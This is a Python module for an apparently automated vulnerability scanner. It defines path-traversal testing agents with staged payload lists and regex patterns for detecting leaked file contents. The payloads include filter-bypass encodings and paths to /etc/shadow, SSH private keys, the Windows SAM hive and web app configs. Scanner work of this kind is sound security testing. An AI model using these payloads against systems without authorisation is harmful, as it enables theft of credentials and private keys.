"""Path Traversal Agent - CWE-22."""

import re
from typing import Dict, List, Pattern

from ..base import BaseAgent, PayloadStage


class PathTraversalAgent(BaseAgent):
    """
    Path Traversal testing agent.

    Tests for directory traversal vulnerabilities including:
    - Basic path traversal
    - Encoded path traversal
    - Null byte injection
    - Path normalization bypass

    Payloads derived from ZAP's PathTraversalScanRule.java
    """

    @property
    def vulnerability_type(self) -> str:
        return "path_traversal"

    @property
    def cweid(self) -> int:
        return 22

    @property
    def priority(self) -> int:
        return 7  # High priority

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                # Basic traversal sequences
                "../",
                "..\\",
                "../../../",
                "..\\..\\..\\",
                # With file targets
                "../etc/passwd",
                "..\\windows\\win.ini",
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",
            ],
            PayloadStage.CONFIRM: [
                # Deeper traversal
                "../../../../../../../etc/passwd",
                "..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
                # Double encoding
                "..%2f..%2f..%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                # Mixed slashes
                "../\\../\\../etc/passwd",
                "..\\/../\\/../windows/win.ini",
                # URL encoded
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
            ],
            PayloadStage.EXPLOIT: [
                # Sensitive file access
                "../../../etc/shadow",
                "../../../etc/hosts",
                "../../../var/log/auth.log",
                "../../../home/user/.ssh/id_rsa",
                "../../../home/user/.bash_history",
                "../../../root/.ssh/authorized_keys",
                # Windows sensitive files
                "..\\..\\..\\Windows\\System32\\config\\SAM",
                "..\\..\\..\\Windows\\System32\\config\\SYSTEM",
                "..\\..\\..\\Users\\Administrator\\.ssh\\id_rsa",
                # Web application configs
                "../../../var/www/html/config.php",
                "../../../var/www/html/wp-config.php",
                "..\\..\\..\\inetpub\\wwwroot\\web.config",
            ],
            PayloadStage.BYPASS: [
                # Filter bypass - doubled sequences
                "....//....//....//etc/passwd",
                "....\\\\....\\\\....\\\\windows\\win.ini",
                # Filter bypass - alternate encoding
                "..%c0%af..%c0%afetc/passwd",
                "..%c1%9c..%c1%9cwindows/win.ini",
                # Unicode encoding
                "..%u002f..%u002f..%u002fetc/passwd",
                "..%u005c..%u005c..%u005cwindows\\win.ini",
                # Null byte (legacy)
                "../../../etc/passwd%00",
                "../../../etc/passwd%00.jpg",
                "../../../etc/passwd\x00.pdf",
                # Path truncation
                "../../../etc/passwd" + "A" * 200,
                # Mixed techniques
                "....//....//....//etc/passwd%00",
                "..%252f..%252f..%252fetc%252fpasswd",
                # Backslash on Linux
                "..\\..\\..\\etc\\passwd",
                # Forward slash on Windows
                "../../../windows/win.ini",
                # Case variations (Windows)
                "..\\..\\..\\WINDOWS\\WIN.INI",
            ],
        }

    def get_detection_patterns(self) -> List[Pattern]:
        """Return patterns that indicate path traversal vulnerability."""
        patterns = [
            # /etc/passwd content
            r"root:.*:0:0:",
            r"daemon:.*:1:1:",
            r"bin:.*:2:2:",
            r"sys:.*:3:3:",
            r"nobody:.*:65534:",
            r"www-data:.*:",
            r"mysql:.*:",
            r"/bin/bash",
            r"/bin/sh",
            r"/sbin/nologin",
            r"/usr/sbin/nologin",
            # /etc/shadow (if readable)
            r"root:\$[0-9a-z]+\$",
            r":\$1\$|\$5\$|\$6\$",  # Password hashes
            # /etc/hosts
            r"127\.0\.0\.1\s+localhost",
            r"::1\s+localhost",
            # win.ini content
            r"\[fonts\]",
            r"\[extensions\]",
            r"\[mci extensions\]",
            r"\[files\]",
            # Windows system files
            r"\[boot loader\]",
            r"\[operating systems\]",
            r"MSDOS\.SYS",
            # SSH keys
            r"-----BEGIN.*PRIVATE KEY-----",
            r"ssh-rsa AAAA",
            r"ssh-ed25519 AAAA",
            # Configuration files
            r"DB_PASSWORD",
            r"mysql_connect",
            r"mysqli_connect",
            r"pg_connect",
            r"<connectionStrings>",
            r"DefaultConnection",
            # Log files
            r"sshd.*session",
            r"sudo:.*session",
            # Web config indicators
            r"<\?php",
            r"require_once",
            r"include_once",
        ]
        return [re.compile(p, re.IGNORECASE | re.MULTILINE) for p in patterns]


class PathTraversalAbsoluteAgent(PathTraversalAgent):
    """Specialized agent for absolute path access."""

    @property
    def vulnerability_type(self) -> str:
        return "path_traversal_absolute"

    @property
    def staged_payloads(self) -> Dict[PayloadStage, List[str]]:
        return {
            PayloadStage.PROBE: [
                "/etc/passwd",
                "C:\\windows\\win.ini",
                "C:/windows/win.ini",
            ],
            PayloadStage.CONFIRM: [
                "/etc/hosts",
                "/etc/hostname",
                "C:\\Windows\\System32\\drivers\\etc\\hosts",
            ],
            PayloadStage.EXPLOIT: [
                "/etc/shadow",
                "/var/log/auth.log",
                "/root/.ssh/id_rsa",
                "C:\\Windows\\System32\\config\\SAM",
            ],
            PayloadStage.BYPASS: [
                "//etc/passwd",
                "///etc/passwd",
                "file:///etc/passwd",
            ],
        }
